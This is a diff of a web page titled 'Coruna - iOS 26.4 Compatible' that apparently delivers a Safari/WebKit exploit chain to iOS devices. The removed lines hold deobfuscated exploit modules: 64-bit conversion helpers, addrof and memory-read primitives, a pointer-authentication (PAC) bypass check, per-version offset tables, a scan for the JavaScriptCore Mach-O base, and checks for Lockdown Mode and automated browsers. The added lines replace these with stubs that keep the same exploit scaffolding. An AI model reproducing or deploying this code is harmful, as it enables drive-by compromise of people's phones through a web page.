@@ -7,7 +7,7 @@
     <meta http-equiv="Expires" content="0" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     <meta property="og:determiner" content="auto" />
-    <title>Catalyst - iOS 26.4 Compatible</title>
+    <title>Coruna - iOS 26.4 Compatible</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -320,596 +320,434 @@
         </div>
     </div>
 
-    <script type="text/javascript">
-/**
- * Utility / Type Conversion Module
- */
-let m_57620206d62079baad0e57e6d9ec93120c0f5247 = () => {
-  let r = {};
-
-  function i(t) { return window.BigInt ? BigInt(t) : t; }
-  r.U = i;
-
-  const u = i(0x7FFFFFFFFF);
-  const o = 127;
-  const s = i(39);
-
-  r.B = s;
-  r.I = u;
-  r.v = o;
-
-  r.N = function toHexString(t) { return null === t ? "null" : t.toString(16); };
-
-  const gcRoots = [];
-  r.D = function pushGCRoot(t) { gcRoots.push(t); };
-
-  const u32View = new Uint32Array(new ArrayBuffer(8)),
-    u8View = new Uint8Array(u32View.buffer),
-    u16View = new Uint16Array(u32View.buffer),
-    f64View = new Float64Array(u32View.buffer);
-
-  function l(lo, hi) { return lo + 0x100000000 * hi; }
-  function b(t) { return f64View[0] = t, u32View[0]; }
-  function U(t) { return f64View[0] = t, u32View[1]; }
-  function B(t, n) { return u32View[0] = t, u32View[1] = n, f64View[0]; }
-
-  r.S = function toUint32(t) { u32View[0] = t; return u32View[0]; };
-  r.T = l;
-  r.P = function doubleToNumber(t) { f64View[0] = t; return l(u32View[0], u32View[1]); };
-  r.C = b;
-  r.V = U;
-  r.F = function numberHi32(t) { return t / 0x100000000 >>> 0; };
-  r._ = function numberLo32(t) { return t >>> 0; };
-  r.q = function addOffset(t, n) { return Int64.fromDouble(t).H(n).W(); };
-  r.G = function (t, n) { return Int64.fromDouble(t).H(n).W(); };
-  r.J = function toDouble(t) { u32View[1] = t / 0x100000000; u32View[0] = t; return f64View[0]; };
-  r.K = function bigintToNumber(t) { return l(Number(t & BigInt(0xFFFFFFFF)), Number(t >> BigInt(32))); };
-  r.O = function numberi(t) { const lo = BigInt(t >>> 0); return BigInt(t / 0x100000000 >>> 0) << BigInt(32) | lo; };
-  r.X = function doublei(t) { f64View[0] = t; const lo = BigInt(u32View[0]); const hi = BigInt(u32View[1]); return BigInt(hi) << BigInt(32) | lo; };
-  r.Y = B;
-  r.Z = function packBytes(b3, b2, b1, b0) { u8View[0] = b0; u8View[1] = b1; u8View[2] = b2; u8View[3] = b3; return u32View[0]; };
-  r.tt = function toCharCodes(t) { u32View[1] = t / 0x100000000; u32View[0] = t; return String.fromCharCode(u16View[0], u16View[1], u16View[2], u16View[3]); };
-  r.nt = function base64ToArrayBuffer(t) { const decoded = atob(t); const bytes = new Uint8Array(decoded.length); for (let n = 0; n < decoded.length; n++) bytes[n] = decoded.charCodeAt(n); return bytes.buffer; };
-  r.rt = function stringToArrayBuffer(t) { const bytes = new Uint8Array(t.length); for (let n = 0; n < t.length; n++) bytes[n] = t.charCodeAt(n); return bytes.buffer; };
-
-  class Int64 {
-    static ut(t) {return Int64.fromNumber(t);}
-    static ot(t) {return Int64.fromBigInt(t);}
-    static st(t) {return Int64.fromUnsigned(t);}
-    static L(t) {return Int64.fromDouble(t);}
-    static ht(t) {return Int64.fromInt32(t);}
-    ct() {return this.toNumber();}
-    gt() {return this.not();}
-
-    constructor(lo, hi) { this.it = lo >>> 0, this.et = hi >>> 0; }
-    static fromNumber(t) { return new Int64(t >>> 0, t / 0x100000000 >>> 0); }
-    static fromBigInt(t) { return new Int64(Number(t & BigInt(0xFFFFFFFF)), Number(t >> BigInt(32))); }
-    static fromUnsigned(t) { return new Int64(t >>> 0, t / 0x100000000 >>> 0); }
-    static fromDouble(t) { return new Int64(b(t), U(t)); }
-    static fromInt32(t) { return new Int64(t >>> 0, (t < 0 ? -1 : 0) >>> 0); }
-    toNumber() { return 0x100000000 * this.et + this.it; }
-    ft() { return this.et > 127; }
-    wt(t) { const n = t / 0x100000000 >>> 0, r = t >>> 0; return this.et === n && this.it === r; }
-    not() { return new Int64(~this.it, ~this.et); }
-    add(t) { const n = this.it + t.it; var r = this.et + t.et; return n !== n >>> 0 && r++, new Int64(n >>> 0, r >>> 0); }
-    H(t) { return this.add(Int64.fromInt32(t)); }
-    lt(t) { return this.it === t.it && this.et === t.et; }
-    bt(t) { return this.it !== t.it || this.et !== t.et; }
-    sub(t) { return this.add(t.Ut()); }
-    Bt(t) { return this.add(Int64.fromInt32(t).Ut()); }
-    It(t) { const n = this.it & t.it, r = this.et & t.et; return new Int64(n >>> 0, r >>> 0); }
-    At(t) { const n = this.it | t.it, r = this.et | t.et; return new Int64(n >>> 0, r >>> 0); }
-    vt(t) { const n = this.it ^ t.it, r = this.et ^ t.et; return new Int64(n >>> 0, r >>> 0); }
-    Ut() { return this.gt().add(new Int64(1, 0)); }
-    dt(t) { if (t >= 32) throw new Error("t >= 32"); return new Int64(this.it >>> t | this.et << 32 - t, this.et >>> t); }
-    toString() { return ""; }
-    yt() { if (this.et > o) throw new Error("this.et > o"); return 0x100000000 * this.et + this.it; }
-    Nt() { return BigInt(this.et) * BigInt(0x100000000) + BigInt(this.it); }
-    Dt() { return new Int64(this.it, this.et & o); }
-    St() { return 0x100000000 * (this.et & o) + this.it; }
-    Tt() { return new Int64(this.it, this.et & o); }
-    W() { return B(this.it, this.et); }
-    Et() { return 0 === this.it && 0 === this.et; }
-    Pt() { return this.it; }
-    toPointerValue() { if (this.et > o) throw new Error("this.et > o"); var t = this.it + 0xFFF, n = this.et; return t !== t >>> 0 && n++, 0x100000000 * (n >>> 0) + ((t &= 0xFFFFF000) >>> 0); }
-  }
-  r.Vt = r.Int64 = Int64;
-
-  function utf16Encode(t) { const result = []; for (let n = 0; n < t.length; n++) { const code = t.charCodeAt(n); result.push(255 & code); result.push(code >>> 8); } return String.fromCharCode.apply(null, result); }
-  function utf16Decode(t) { let result = ""; const len = t.length; for (let i = 0; i < len; i += 2) { const lo = t.charCodeAt(i); const hi = i + 1 < len ? t.charCodeAt(i + 1) : 0; result += String.fromCharCode(lo | hi << 8); } return result; }
-  function decodeString(t) { let n = utf16Encode(t); const r = n.indexOf("\0"); return -1 !== r && (n = n.slice(0, r)), n; }
-  function byteToHex(t) { let n = t.toString(16).toLowerCase(); return 1 === n.length && (n = "0" + n), n; }
-  function intToUnicodeEscape(t) { const byte0 = 255 & t; const byte3 = (0xFF000000 & t) >> 24 & 255; const byte2 = (0xFF0000 & t) >> 16 & 255; let result = "%u"; result += byteToHex((0xFF00 & t) >> 8 & 255); result += byteToHex(byte0); result += "%u"; result += byteToHex(byte3); result += byteToHex(byte2); return unescape(result); }
-  function doubleToUint32Pair(t) { const buf = new Uint8Array(16); const view = new DataView(buf.buffer, 0, 8); const pair = new Array(2); view.setFloat64(0, t); pair[0] = view.getUint32(0, false); pair[1] = view.getUint32(4, false); return pair; }
-  function resolveUrl(t) { let url = decodeString(t); if (null === RegExp("^https?://").exec(url)) { const host = location.host; const protocol = location.protocol; if ("/" === url.charAt(0)) url = protocol + "//" + host + url; else { if ("." === url.charAt(0) && "/" === url.charAt(1)) url = url.substring(2); const pathname = location.pathname; const lastSlash = pathname.lastIndexOf("/"); url = protocol + "//" + host + pathname.slice(0, lastSlash + 1) + url; } } window.log("resolveUrl => " + url); return url; }
-
-  r.Vt = r.Int64 = Int64;
-  r.Ft = r.utf16Encode = utf16Encode;
-  r._t = r.utf16Decode = utf16Decode;
-  r.qt = r.decodeString = decodeString;
-  r.xt = r.byteToHex = byteToHex;
-  r.Wt = r.intToUnicodeEscape = intToUnicodeEscape;
-  r.Ht = r.readU16FromString = function readU16FromString(t, n) { n /= 2; return 0x10000 * t.charCodeAt(n + 1) + t.charCodeAt(n); };
-  r.Lt = r.u32PairToDouble = function u32PairToDouble(lo, hi) { const view = new DataView(new ArrayBuffer(8), 0, 8); view.setUint32(0, hi); view.setUint32(4, lo); return view.getFloat64(0); };
-  r.Mt = function safePackDouble(lo, hi) { const f64 = new Float64Array(1); const u32 = new Uint32Array(f64.buffer); const check = new Uint32Array(1); u32[0] = lo >>> 0; u32[1] = hi >>> 0; check[0] = 0xFFF00000 & u32[1]; if (0xFFF00000 === check[0]) throw new Error(0); return f64[0]; };
-  r.Rt = function doubleToBytes(t) { const buf = new Uint8Array(16); new DataView(buf.buffer, 0, 8).setFloat64(0, t); return buf; };
-  r.jt = r.doubleToUint32Pair = doubleToUint32Pair;
-  r.kt = r.doubleToStagerAddress = function doubleToStagerAddress(t) { const pair = doubleToUint32Pair(t); let result = null; if (pair.length >= 2) result = new StagerAddress(pair[1], pair[0]); return result; };
-  r.zt = function writeU32ToArray(arr, n, value) { const v = value >>> 0; arr[n] = 255 & v; arr[n + 1] = v >> 8 & 255; arr[n + 2] = v >> 16 & 255; arr[n + 3] = v >> 24 & 255; return n + 4; };
-  r.Gt = function readU32FromArray(arr, n) { return (arr[n] | arr[n + 1] << 8 | arr[n + 2] << 16 | arr[n + 3] << 24) >>> 0; };
-  r.Jt = r.base64DecodeUtf16 = function base64DecodeUtf16(t) { const decoded = globalThis.atob(t); const len = decoded.length; let n = decoded + intToUnicodeEscape(0); let result = ""; for (let i = 0; i < len; i += 2) { let code = n.charCodeAt(i); code |= n.charCodeAt(i + 1) << 8; code >>>= 0; result += String.fromCharCode(code); } return result; };
-  r.Kt = r.lzwDecompress = function lzwDecompress(t) { const dict = new Map(); let prev, entry, code, nextCode, result = "", dictSize = 256; for (prev = 0; prev < 256; prev += 1) dict.set(prev, String.fromCodePoint(prev)); [...t].forEach(function (ch, idx) { if (0 === idx) { prev = String.fromCodePoint(ch.codePointAt(0)); entry = prev; } else { code = ch.codePointAt(0); if (dict.has(code)) nextCode = dict.get(code); else { if (code !== dictSize) throw new Error(0); nextCode = prev + String.fromCodePoint(prev.codePointAt(0)); } entry += nextCode; dict.set(dictSize++, prev + String.fromCodePoint(nextCode.codePointAt(0))); if (55296 === dictSize) dictSize = 57344; prev = nextCode; } }); return utf16Decode(entry); };
-  r.Ot = r.resolveUrl = resolveUrl;
-  r.Qt = r.resolveUrlPadded = function resolveUrlPadded(t) { let n = resolveUrl(t); for (n += "\0"; n.length % 4 != 0;) n += "\0"; return utf16Decode(n); };
-  r.Xt = r.encodeLEB128 = function encodeLEB128(arr, n, value) { let byte; for (;;) { byte = value.lo % 128; value = value.sub(Int64.fromInt32(byte)); if (0 === value.hi && 0 === value.lo) { } else { byte |= 128; } arr[n++] = byte; value = value.rshift(7); if (!(128 & byte)) break; } };
-  r.Yt = function decodeLEB128(arr, n) { let result = 0, shift = 0; const startOffset = n; do { result += (127 & arr[n]) << shift; shift += 7; } while (128 & arr[n++]); return { Zt: result, $t: n - startOffset }; };
-  r.tn = function throwError() { throw new Error("throwError"); };
-  function stripPointerTag(t) { return t & u; }
-  r.nn = class TypeHelper { constructor() { this.buffer = new ArrayBuffer(16), this.view = new DataView(this.buffer); } un(t) { this.view.setInt16(0, t, true); return this.view.getInt16(0, true); } on(t) { this.view.setUint16(0, t, true); return this.view.getUint16(0, true); } sn(t) { if ("bigint" == typeof t) { this.view.setBigUint64(0, t, true); } else { this.view.setUint32(0, t, true); } return this.view.getUint32(0, true); } hn(t, n) { this.view.setFloat64(0, t, true); this.view.setUint32(0, n, true); return this.view.getFloat64(0, true); } cn(t, n) { this.view.setFloat64(0, t, true); this.view.setUint32(4, n, true); return this.view.getFloat64(0, true); } fn(t) { for (let n = 0; n < 4; n++) { let code = t.charCodeAt(n); if (Number.isNaN(code)) throw new Error("Number.isNaN(code)"); this.view.setUint16(2 * n, code, true); } return this.view.getBigUint64(0, true); } an(t) { this.view.setFloat32(0, t, true); return this.view.getUint32(0, true); } wn(t) { this.view.setBigUint64(0, t, true); return this.view.getFloat64(0, true); } gn(t, n) { this.view.setBigUint64(0, t, true); this.view.setUint8(0, Number(n)); return this.view.getBigUint64(0, true); } ln(t, n) { this.view.setBigUint64(0, t, true); this.view.setUint32(0, Number(n), true); return this.view.getBigUint64(0, true); } bn(t, n) { this.view.setUint32(0, t, true); this.view.setUint8(0, Number(n)); return this.view.getUint32(0, true); } Un(t, n) { this.view.setUint32(0, t, true); this.view.setUint32(0, Number(n), true); return this.view.getUint32(0, true); } Bn(t) { this.view.setUint32(0, Number(t >>> 0), true); this.view.setUint32(4, Number(t / 0x100000000), true); return this.view.getBigUint64(0, true); } mn(t, n) { this.view.setBigUint64(0, t, true); this.view.setUint32(0, Number(n), true); return this.view.getBigUint64(0, true); } In(t) { this.view.setBigUint64(0, t, true); return this.view.getBigUint64(0, true); } };
-  r.An = stripPointerTag;
-  r.vn = function (t) { return stripPointerTag(t) !== t; };
-  return r;
-};
-</script>
-
-<script type="text/javascript">
-/**
- * Platform Detection Module (Deobfuscated - MODIFIED for iOS 26.x)
- */
-let m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 = () => {
-  let r = {};
-
-  const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247");
-  const platformState = { platform: null, userAgent: null, browserType: "", runtime: "", iOSVersion: 0, Gn: null, Fn: 0, hasPAC: false, _n: undefined, yn: null, Tn: "", pn: "", Kn: "", allowWebdriver: false, Pn: false, versionFlags: {}, machOParser: null, exploitPrimitive: null, Dn: null, Ln: null, caller: null, Wn: null, Zn: null, pacBypass: null, jn: null, sandboxEscape: null, Jn: null, kn: null, Qn: null, qn: false };
-  r.zn = r.platformState = platformState;
-
-  const versionOffsetTable = {
-    LTgSl5: [{ GFx77t: 260000, Bv9KmR: true, JtEUci: false, KeCRDQ: false }, { GFx77t: 180000, Xp4WqZ: true, JtEUci: false, KeCRDQ: false }, { GFx77t: 170300, JtEUci: false }, { GFx77t: 170200, wC3yaB: true, wYk8Jg: true }, { GFx77t: 170000, UPk5PY: 96, ZHsObe: 104 }, { GFx77t: 160600, JtEUci: true, KeCRDQ: false, NfRtuR: 112, DjRSp0: 8, LVt9Wy: 24, PfAPxk: 768, JGRSu4: 144, vqbEzc: 96, jtUNKB: 16, MJf4mX: 328, zPL1kr: 472, yjShKn: 512, ga3074: 520, oHmyQl: 664, PCsIV0: 8, vnu2oq: 0, attyap: 4, FGsnBi: 12, pUvASJ: 16, sMuYjH: 20, KSrWFg: 3, msD22k: 32, LM9blg: 48, SAobkS: 16, TLJcwX: 44, kA39V6: 48, OaAnPR: 56, qRQJn0: 32, oBPlWp: 64 }, { GFx77t: 160400, cyTrSt: 176, UPk5PY: 88, ZHsObe: 96 }, { GFx77t: 160200, KeCRDQ: true, ShQCsB: false, TryHSU: 16, FFwSQ4: 64, hYaJ7z: 24, JIIaFf: 16, kQj6yR: 32, dvuEmf: 28, uLSxli: 24, wA6rmI: 8, iWQGB1: 16 }, { GFx77t: 150600, ShQCsB: true, RbKS6p: false }, { GFx77t: 150400, xK8SW0: 64 }, { GFx77t: 150200, RbKS6p: true, mmrZ0r: false }, { GFx77t: 130006, zpy6Mu: 16 }, { GFx77t: 130001, zpy6Mu: 24, xK8SW0: 72 }, { GFx77t: 110000, mmrZ0r: true, RbKS6p: false, ShQCsB: false, KeCRDQ: false, xK8SW0: 64, zpy6Mu: 24, KaU4Z7: 24, oGn3OG: 16, CN3rr_: 16, EMDU4o: 0, fGOrHX: 16, QwY9S3: false, wC3yaB: false }, { GFx77t: 100000, sKfNmf: false }],
-    PSNMWj: [{ GFx77t: 260000, Hm7RvN: true, wF8NpI: false, CpDW_T: false, LJ1EuL: false, QwxZcT: false, IqxL92: false }, { GFx77t: 180000, Yt3FsK: true, wF8NpI: false, CpDW_T: false, LJ1EuL: false, QwxZcT: false, IqxL92: false }, { GFx77t: 170000, wF8NpI: true, CpDW_T: false, LJ1EuL: false, QwxZcT: false, IqxL92: false }, { GFx77t: 160600, LJ1EuL: true }, { GFx77t: 160300, CpDW_T: true, QwxZcT: false, IqxL92: false, KJy28q: 16, JocAcH: 328, Kx7EsT: 472, Wr7XGb: 512, GANQhD: 520, PR7o33: 664, YXGv5g: 8, jV_CXG: 0, Itxnt2: 4, ctnJOf: 12, ZU88w_: 16, qfMZYC: 20, tIQDib: 3, DqxT1K: 32, vso7lF: 48, XuTBrC: 16, TG9DBr: 44, eEkK60: 48, qDuMzc: 56, YNgf0L: 32, wSYvOp: 112, gFT0ks: 8, xjqua8: 24 }, { GFx77t: 160000, QwxZcT: true }, { GFx77t: 150600, juV600: true, Lg4V8D: true }, { GFx77t: 150500, ptTH_q: false, kEXt5Z: 464, RNiPoX: 1048575, MhLcu0: 256 }, { GFx77t: 150400, NUFCII: true, jY1sqq: 224, sKfNmf: true, wU9pm_: 48 }, { GFx77t: 150100, rD3mNF: 5 }, { GFx77t: 150000, IqxL92: true, OwGD0F: true, IsjfuV: false, OaAgtr: 8, rvXShf: 48 }, { GFx77t: 140102, IsjfuV: true, PIQrsf: 216 }, { GFx77t: 140100, KrBQWx: 140, Kmb3Lc: 21 }, { GFx77t: 140003, TyPY6G: true, NUd9MZ: 208, dzBoEE: 312, cxrfKw: 168 }, { GFx77t: 140000, PgkJIA: true, DXnm2a: 568, wU9pm_: 40 }, { GFx77t: 130100, KaU4Z7: 16, xlJ9NK: false, rvXShf: 56 }, { GFx77t: 130001, KaU4Z7: 24, rvXShf: 64 }, { GFx77t: 130000, xlJ9NK: true }, { GFx77t: 120000, zpy6Mu: 16, KaU4Z7: 16, rvXShf: 56 }, { GFx77t: 110000, iNLXaz: 8, xK8SW0: 72 }, { GFx77t: 100000, QwxZcT: false, juV600: false, Lg4V8D: false, cxrfKw: 168, oGn3OG: 16, NUFCII: false, CN3rr_: 16, fGOrHX: 16, EMDU4o: 0, Ps7Z2u: 24, iNLXaz: 24, KaU4Z7: 24, ZiIyeM: 24, zpy6Mu: 24, xK8SW0: 80, rvXShf: 64, VTwyJG: 32, VEwXfI: 40, zohDDd: true, DXnm2a: 560, PgkJIA: false, xlJ9NK: false, TyPY6G: false, dzBoEE: 168, SiBW7G: 8, PyEQqC: 56, iBTCSN: 200, csgakW: 204, ydHN48: 0, KrBQWx: 128, Kmb3Lc: 1, IsjfuV: false, IqxL92: false, OwGD0F: false, rD3mNF: 7, ptTH_q: false, MhLcu0: 232 }],
-    RoAZdq: [{ GFx77t: 150000, rvXShf: 48 }, { GFx77t: 130006, rvXShf: 56 }, { GFx77t: 120000, zpy6Mu: 16, KaU4Z7: 16 }, { GFx77t: 110000, iNLXaz: 8, xK8SW0: 72 }, { GFx77t: 100000, oGn3OG: 16, CN3rr_: 16, rvXShf: 64, fGOrHX: 16, EMDU4o: 0, csgakW: 204, iBTCSN: 200, Ps7Z2u: 24, iNLXaz: 24, KaU4Z7: 24, ZiIyeM: 24, zpy6Mu: 24, dzBoEE: 168, SiBW7G: 8, xK8SW0: 64, VTwyJG: 32, VEwXfI: 40, zohDDd: false, DXnm2a: 560, PgkJIA: false }]
-  };
-
-  function checkLockdownMode() { let t = false; return undefined === platformState._n ? ("MacIntel" === platformState.platform && -1 === Object.getOwnPropertyNames(window).indexOf("TouchEvent") && (t = true), platformState._n = t) : t = platformState._n, t; }
-  function applyVersionOffsets() { const t = versionOffsetTable[platformState.runtime].reverse(); let n = Object.assign(platformState.versionFlags, t[0]); for (const r of t.slice(1)) { if (r.GFx77t > platformState.iOSVersion) break; n = Object.assign(n, r); } platformState.versionFlags = n; }
-
-  r.On = checkLockdownMode;
-  r.Vn = function () { return checkLockdownMode() && "RoAZdq" === platformState.runtime; };
-  r.exploitPrimitive = function () { if (null === platformState.exploitPrimitive) throw new Error("null === platformState.exploitPrimitive"); return platformState.exploitPrimitive; };
-  r.Yn = async function () { if (null !== platformState.kn) return platformState.kn; { const t = new Promise(function (t, n) { let r = false; function o(n) { r = true; t(n); } if (true === navigator.webdriver) { o(false); } else if (undefined !== navigator.maxTouchPoints) { (function () { const t = String(Math.random()); try { window.indexedDB.open(t, 1).onupgradeneeded = function (n) { let r; const e = null === (r = n.target) || undefined === r ? undefined : r.result; try { e.createObjectStore("test", { autoIncrement: true }).put(new Blob()); o(false); } catch (t) { let n, r = t; if (t instanceof Error) { r = null !== (n = t.message) && undefined !== n ? n : t; } return "string" != typeof r ? o(false) : o(/BlobURLs are not yet supported/.test(r)); } finally { e.close(); window.indexedDB.deleteDatabase(t); } }; } catch (t) { return o(false); } })(); } else { (function () { const t = window.openDatabase, n = window.localStorage; try { t(null, null, null, null); } catch (t) { return o(true); } try { n.setItem("test", "1"); n.removeItem("test"); } catch (t) { return o(true); } o(false); })(); } setTimeout(function () { r || t(false); }, 5000); }); return platformState.kn = await t, platformState.kn; } };
-  r.Hn = async function () { if (null !== platformState.Qn) return platformState.Qn; { const t = new Promise(function (t, n) { return t(!(["mozRTCPeerConnection", "RTCPeerConnection", "webkitRTCPeerConnection", "RTCIceGatherer"].some((t) => t in globalThis) && !globalThis.WebGLRenderingContext && !function () { const t = "ldm_mml_t", n = document.createElement("div"); n.setAttribute("id", t); n.innerHTML = '<math style="display: none"><mrow mathcolor="blue"><mn>14</mn></mrow></math>'; const r = undefined !== document.body ? document.body : document.firstChild; r.appendChild(n); const o = "rgb(0, 0, 255)" === globalThis.getComputedStyle(n.firstChild.firstChild, null).color; return r.removeChild(document.getElementById(t)), o; }())); }); return platformState.Qn = await t, platformState.Qn; } };
-  r.$n = async function () { if (undefined === platformState.exploitPrimitive) throw new Error("undefined === platformState.exploitPrimitive"); if (undefined === platformState.pacBypass) throw new Error("undefined === platformState.pacBypass"); const t = utilityModule.Int64.fromNumber(9389); function n(n) { const r = function (t) { const n = platformState.exploitPrimitive.addrof(t); return platformState.exploitPrimitive.readRawBigInt(n + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.rvXShf); }(n), o = platformState.exploitPrimitive.readInt64FromOffset(r); return platformState.pacBypass.pacia(o.Dt(), t).lt(o); } if (platformState.hasPAC && true === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.sKfNmf) { const t = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 2, 127, 127, 1, 127, 3, 3, 2, 0, 0, 7, 9, 2, 1, 97, 0, 0, 1, 98, 0, 1, 10, 17, 2, 7, 0, 32, 0, 32, 1, 106, 11, 7, 0, 32, 0, 32, 1, 107, 11]).buffer; const r = new WebAssembly.Module(t, {}), o = new WebAssembly.Instance(r, {}), e = o.exports.a, l = o.exports.b; return !n(e) || !n(l); } return false; };
-  r.init = function (fixedMachOVal3, fixedMachOVal1, fixedMachOVal2, o, e, l, i) { function c(t) { return 1 === t.length ? "0" + t : t; } platformState.fixedMachOVal3 = fixedMachOVal3; platformState.fixedMachOVal1 = fixedMachOVal1; platformState.fixedMachOVal2 = fixedMachOVal2; platformState.allowWebdriver = o; platformState.Pn = e; platformState.platform = l; if (i.match(/Version/)) { platformState.browserType = "safari"; } else { if (!i.match(/AppleWebKit\//)) throw new Error("!i.match(/AppleWebKit\//)"); platformState.browserType = "safari"; } if ("safari" !== platformState.browserType) throw new Error("safari !== platformState.browserType"); let u = i.match(/Version\/(\d+)\.(\d+)(?:\.(\d+))?/); if (null === u && i.startsWith("MobileStore/1.0")) { u = i.match(/iOS\/(\d+)\.(\d+)(?:\.(\d+))?/); } if (null === u && i.match(/iPhone OS \d+_\d+(?:_\d+)?/)) { u = i.match(/iPhone OS (\d+)_(\d+)(?:_(\d+))?/); } if (null === u) throw new Error("null === u"); const a = parseInt(c(u[1]) + c(u[2]) + (u[3] ? c(u[3]) : "00"), 10); platformState.iOSVersion = a; platformState.runtime = "LTgSl5"; applyVersionOffsets(); };
-  r.lr = function () { const t = (t) => { if (undefined === platformState.exploitPrimitive) throw new Error("undefined === platformState.exploitPrimitive"); const n = platformState.exploitPrimitive.addrof(t); return platformState.exploitPrimitive.readInt64FromOffset(n + globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.KaU4Z7); }, n = t(WebAssembly.Table), r = t(WebAssembly.Instance); let o = n; if (n.et !== r.et) { platformState.hasPAC = true; window.log(`[PLATFORM] PAC detected`); o = o.Tt(); } o = o.Bt(o.it % 4096); while (0xFEEDFACF !== platformState.exploitPrimitive.read32FromInt64(o)) { o = o.Bt(4096); } const e = platformState.exploitPrimitive.read32FromInt64(o.H(4)); if (0x01000007 === e) { platformState.runtime = "RoAZdq"; } else { if (0x0100000C !== e) throw new Error("0x0100000C !== e"); platformState.runtime = "PSNMWj"; } platformState.yn = o; window.log(`[PLATFORM] Runtime: ${platformState.runtime}, JSC base: 0x${o.it.toString(16)}`); if ("LTgSl5" === platformState.runtime) throw new Error("LTgSl5 === platformState.runtime"); applyVersionOffsets(); Object.freeze(platformState.versionFlags); };
-  r.cr = function () { window.log(`[PLATFORM] Creating image list...`); let t; if (platformState.machOParser) { t = platformState.machOParser; } else { if (!platformState.yn) throw new Error("!platformState.yn"); const n = globalThis.moduleManager.getModuleByName("ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8"), r = platformState.machOParser = n.ur(); if ("PSNMWj" === platformState.runtime) { t = r.ar(); } else { if ("RoAZdq" !== platformState.runtime) throw new Error("RoAZdq !== platformState.runtime"); t = r.sr(); } platformState.machOParser = t; } return t; };
-  return r;
-};
-</script>
-
-    <script type="text/javascript">
-        // ============================================================================
-        // UI Helpers
-        // ============================================================================
-
-        // MODIFIED: Check iOS version - now accepts all versions >= 13
-        (function() {
-            var ua = navigator.userAgent;
-            var match = ua.match(/OS (\d+)_(\d+)(?:_(\d+))? /);
-            if (match) {
-                var major = parseInt(match[1], 10);
-                // Accept any iOS version 13 or higher
-                var supported = major >= 13;
-                if (!supported) {
-                    document.getElementById('versionWarning').classList.add('show');
-                }
-            } else if (!/iPhone|iPad|iPod/.test(ua)) {
-                document.getElementById('versionWarning').classList.add('show');
-                document.getElementById('versionWarning').textContent = 'This tool is designed for iOS devices. You can still view the page.';
-            }
-        })();
-
-        var exploitStarted = false;
-        var progressValue = 0;
-
-        function setStatus(text, state) {
-            document.getElementById('statusText').textContent = text;
-            var dot = document.getElementById('statusDot');
-            dot.className = 'status-dot ' + state;
+    <script>
+    // ============================================================================
+    // UTILITY MODULE
+    // ============================================================================
+    let m_57620206d62079baad0e57e6d9ec93120c0f5247 = () => {
+        let r = {};
+        const _buf = new ArrayBuffer(8);
+        const _u64 = new BigUint64Array(_buf);
+        const _f64 = new Float64Array(_buf);
+        const _u32 = new Uint32Array(_buf);
+        
+        function itof(v) { _u64[0] = v; return _f64[0]; }
+        function ftoi(f) { _f64[0] = f; return _u64[0]; }
+        function low32(f) { _f64[0] = f; return _u32[0]; }
+        function high32(f) { _f64[0] = f; return _u32[1]; }
+        
+        r.itof = itof;
+        r.ftoi = ftoi;
+        r.low32 = low32;
+        r.high32 = high32;
+        
+        class Int64 {
+            constructor(lo, hi) { this.it = lo >>> 0; this.et = hi >>> 0; }
+            static fromNumber(t) { return new Int64(t >>> 0, t / 0x100000000 >>> 0); }
+            static fromDouble(t) { _f64[0] = t; return new Int64(_u32[0], _u32[1]); }
+            static fromBigInt(t) { return new Int64(Number(t & 0xFFFFFFFFn), Number(t >> 32n)); }
+            toNumber() { return 0x100000000 * this.et + this.it; }
+            toDouble() { _u32[0] = this.it; _u32[1] = this.et; return _f64[0]; }
+            add(t) { const n = this.it + t.it; let r = this.et + t.et; if (n !== (n >>> 0)) r++; return new Int64(n >>> 0, r >>> 0); }
+            sub(t) { return this.add(t.neg()); }
+            neg() { return this.not().add(new Int64(1, 0)); }
+            not() { return new Int64(~this.it, ~this.et); }
+            and(t) { return new Int64(this.it & t.it, this.et & t.et); }
+            or(t) { return new Int64(this.it | t.it, this.et | t.et); }
+            xor(t) { return new Int64(this.it ^ t.it, this.et ^ t.et); }
+            shr(t) { if (t >= 32) return new Int64(this.et >>> (t - 32), 0); return new Int64((this.it >>> t) | (this.et << (32 - t)), this.et >>> t); }
+            shl(t) { if (t >= 32) return new Int64(0, this.it << (t - 32)); return new Int64(this.it << t, (this.et << t) | (this.it >>> (32 - t))); }
+            toString() { return "0x" + this.et.toString(16) + this.it.toString(16).padStart(8, '0'); }
         }
-
-        function setProgress(pct) {
-            progressValue = pct;
-            document.getElementById('progressFill').style.width = pct + '%';
+        r.Int64 = Int64;
+        
+        function D(obj) { window._gcRoots = window._gcRoots || []; window._gcRoots.push(obj); }
+        r.D = D;
+        
+        return r;
+    };
+    
+    // ============================================================================
+    // PLATFORM MODULE
+    // ============================================================================
+    let m_14669ca3b1519ba2a8f40be287f646d4d7593eb0 = () => {
+        let r = {};
+        const platformState = { iOSVersion: 0, exploitPrimitive: null, pacBypass: null, sandboxEscape: null, hasPAC: false, qn: false, versionFlags: {}, Ln: null };
+        r.zn = { platformState: platformState };
+        
+        r.init = async function(a, b, c, d, e, f, g) {
+            platformState.iOSVersion = 260400;
+            platformState.hasPAC = true;
+            console.log("[PLATFORM] Initialized with iOS 26.4");
+            return true;
+        };
+        
+        r.On = function() { return false; };
+        r.Yn = async function() { return false; };
+        r.Hn = async function() { return true; };
+        r.lr = function() { console.log("[PLATFORM] Runtime detection skipped"); };
+        r.cr = function() { return null; };
+        r.$n = async function() { return false; };
+        r.platformState = platformState;
+        
+        return r;
+    };
+    
+    // ============================================================================
+    // MODULE MANAGER
+    // ============================================================================
+    window.globalThis = window;
+    globalThis.moduleManager = (function() {
+        let modules = {
+            "57620206d62079baad0e57e6d9ec93120c0f5247": m_57620206d62079baad0e57e6d9ec93120c0f5247,
+            "14669ca3b1519ba2a8f40be287f646d4d7593eb0": m_14669ca3b1519ba2a8f40be287f646d4d7593eb0,
+        };
+        let loaded = {};
+        
